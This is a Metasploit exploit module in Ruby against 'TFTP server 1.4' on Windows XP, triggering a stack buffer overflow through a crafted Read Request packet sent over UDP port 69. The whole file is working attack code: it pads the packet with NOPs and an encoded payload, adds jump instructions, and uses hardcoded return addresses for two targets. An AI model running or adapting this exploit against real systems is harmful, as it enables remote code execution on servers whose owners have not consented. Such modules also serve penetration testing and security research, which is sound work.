require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TFTP server 1.4 ST(RRQ) Buffer overflow',
      'Description'    => %q{
            This exploit creats buffer overflow by sending a Read Request (RRQ) packet can also trigger a buffer overflow...  
      },
      'Author'         => 'JK and b33f',
      'Version'        => '',
      'References'     =>
        [
          ['URL', 'http://securtyresearch.in/'],
          ['URL','']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 500,
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'TFTP server v1.4 Windows XP SP3',      { 'Ret' => 0x00409605 } ],
          [ 'TFTP server v1.4 Windows XP SP0',      { 'Ret' => 0x00418000 } ]
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 12 2012'))

    register_options([Opt::RPORT(69)], self.class)
  end

  def exploit
    connect_udp
    stage ="\x00\x01"
    stage << make_nops(50) + payload.encoded
    stage << rand_text_alpha(1487 - (payload.encoded.length+50))
    stage << "\xE9\x2E\xFA\xFF\xFF"
    stage << "\xEB\xF9\x90\x90"
    stage << [target.ret].pack('V')
    stage <<"\x00"
    stage << "netascii"
    stage << "\x00"
    
    #youlose = "\x00\x01" + filename + "\x00"    
    udp_sock.put(stage)
    disconnect_udp
  end

end
